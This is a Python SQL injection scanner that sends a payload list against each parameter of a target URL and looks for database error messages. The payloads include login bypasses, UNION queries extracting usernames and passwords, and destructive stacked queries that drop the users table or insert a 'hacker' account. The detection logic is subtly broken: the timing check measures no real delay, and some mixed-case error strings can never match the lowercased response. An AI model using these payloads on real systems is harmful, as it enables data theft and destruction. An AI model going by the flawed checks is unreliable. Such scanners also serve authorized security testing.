import requests
import time

# Expanded list of SQL Injection payloads based on OWASP Top 10 guidelines
SQL_PAYLOADS = [
    # Error-based SQLi
    "' OR '1'='1",  # Basic authentication bypass
    "' OR '1'='1' --", 
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 'x'='x",
    "' OR ''='",
    "' OR '1'='1' -- -",
    "' OR 1=1; --",
    "' OR '1'='1' ({",
    "' OR 1=1#", 

    # Union-based SQLi
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT 1, 'username' --",
    "' UNION SELECT username, password FROM users--",
    
    # Time-based Blind SQLi
    "'; WAITFOR DELAY '0:0:5' --",
    "'; SELECT IF(1=1, SLEEP(5), 0)--",
    "' AND SLEEP(5)--",
    "' OR SLEEP(5) --",
    
    # Boolean-based Blind SQLi
    "' AND '1'='1", 
    "' AND '1'='0",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass')--"
]

# List of expected SQL error messages to identify potential vulnerabilities
EXPECTED_SQL_ERRORS = [
    "syntax error",
    "you have an error in your sql syntax",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_fetch_array()",
    "SQL syntax",
    "Warning: mysql_fetch_assoc()",
    "Warning: mysql_fetch_array()",
    "Warning: mysql_num_rows()",
    "PDOException",
    "Microsoft OLE DB Provider for SQL Server",
    "PostgreSQL query failed"
]

# Function to handle SQL Injection Scanning
def scan_sql_injection(url, params, payloads=SQL_PAYLOADS, expected_errors=EXPECTED_SQL_ERRORS):
    vulnerabilities = []
    
    for param in params:
        for payload in payloads:
            # Inject the payload into the parameter
            test_params = {key: (payload if key == param else value) for key, value in params.items()}
            #print(f"Testing {url} with {test_params}")  # Logging for debugging
            
            try:
                # Sending the request
                response = requests.get(url, params=test_params, timeout=10)
                
                # Log the HTTP response code for further analysis
                #print(f"Response Code: {response.status_code}")
                #print(f"Response Text: {response.text[:500]}...")  # Print first 500 chars of the response
                
                # Check if response contains SQL errors
                if any(error in response.text.lower() for error in expected_errors):
                    vulnerabilities.append((param, payload, 'Error-based SQLi'))
                
                # Check for time-based SQL injection by measuring delay
                elif "sleep" in payload.lower() or "waitfor delay" in payload.lower():
                    start_time = time.time()
                    response_time = time.time() - start_time
                    if response_time > 5:  # Adjust threshold accordingly
                        vulnerabilities.append((param, payload, 'Time-based Blind SQLi'))
            
            except requests.exceptions.Timeout:
                # If a timeout occurs, assume time-based blind SQLi worked
                vulnerabilities.append((param, payload, 'Timeout - Possible Time-based Blind SQLi'))

            except Exception as e:
                print(f"Error occurred: {str(e)}")
    
    return vulnerabilities
